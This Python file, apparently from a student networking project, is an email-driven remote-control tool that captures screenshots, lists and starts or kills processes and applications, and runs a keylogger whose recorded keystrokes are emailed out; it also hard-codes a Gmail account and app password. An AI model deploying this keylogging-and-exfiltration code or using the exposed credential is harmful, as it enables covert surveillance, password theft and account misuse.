from smtplib import SMTP_SSL, SMTP_SSL_PORT
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from PIL import ImageGrab  # Import ImageGrab for local screenshot capture
from appController import AppController  # Import the AppController class
from processController import ProcessController
from keyLog import keyLog

SMTP_HOST = 'smtp.gmail.com'
SMTP_USER = '2d2h.computernetwork.clc.fitus@gmail.com'
SMTP_PASS = 'jvys wjpg mmmx belp'
FROM_EMAIL = '2d2h.computernetwork.clc.fitus@gmail.com'  # Update the from email address

def send_email(subject, body, recipient_email, attachment_path=None):
    msg = MIMEMultipart()
    msg['From'] = FROM_EMAIL
    msg['To'] = recipient_email
    msg['Subject'] = subject

    # Attach text content
    text = MIMEText(body, 'plain')
    msg.attach(text)

    # Attach the screenshot or any other attachment
    if attachment_path:
        with open(attachment_path, 'rb') as attachment_file:
            attachment = MIMEImage(attachment_file.read(), name='screenshot.png')
            msg.attach(attachment)

    # Connect, authenticate, and send mail
    smtp_server = SMTP_SSL(SMTP_HOST, port=SMTP_SSL_PORT)
    smtp_server.set_debuglevel(1)  # Show SMTP server interactions
    smtp_server.login(SMTP_USER, SMTP_PASS)
    smtp_server.sendmail(FROM_EMAIL, recipient_email, msg.as_string())

    # Disconnect
    smtp_server.quit()

def send_screenshot_email(recipient_email):
    screenshot_path = 'Assets/screenshot.png'
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)

    subject = "SCREENSHOT"
    body = "This is the screenshot!"

    send_email(subject, body, recipient_email, screenshot_path)

def send_process_email(recipient_email):
    app_controller = AppController()
    formatted_table = app_controller.viewList()

    subject = "LIST OF APPLICATIONS"
    body = formatted_table  # Use the formatted table as the email body

    send_email(subject, body, recipient_email)
    
def send_bgProcess_email(recipient_email):
    proc_controller = ProcessController()
    formatted_table = proc_controller.viewList()

    subject = "LIST OF BACKGROUND PROCESSES"
    body = formatted_table  # Use formatted table as the email body

    send_email(subject, body, recipient_email)

def send_keyLog_email(recipient_email, duration):
    key_log = keyLog()
    key_log.clearFile("keylog.txt")
    key_log.run_keyLog(duration)
    subject = "KEY LOG"
    body = key_log.read_file("keylog.txt")
    if body is not None:
        send_email(subject, body, recipient_email)
        
def send_startProc_status(recipient_email, process_name):
    proc_controlller = ProcessController()
    
    subject = "PROCESS STATUS REPORT"
    body = proc_controlller.startBackgroundProcess(process_name)
    send_email(subject, body, recipient_email)
    
def send_endProc_status(recipient_email, process_name):
    proc_controlller = ProcessController()
    
    subject = "PROCESS STATUS REPORT"
    body = proc_controlller.endProcess(process_name)
    send_email(subject, body, recipient_email)

def send_startApp(recipient_email, appName):
    app_controlller = AppController()
    
    subject = "APPLICATION STATUS REPORT"
    body = app_controlller.startApp(appName)
    send_email(subject, body, recipient_email)

def send_endApp(recipient_email, app_name):
    app_controller = AppController()

    subject = "APPLICATION STATUS REPORT"
    body = app_controller.endApp(app_name)
    send_email(subject, body, recipient_email)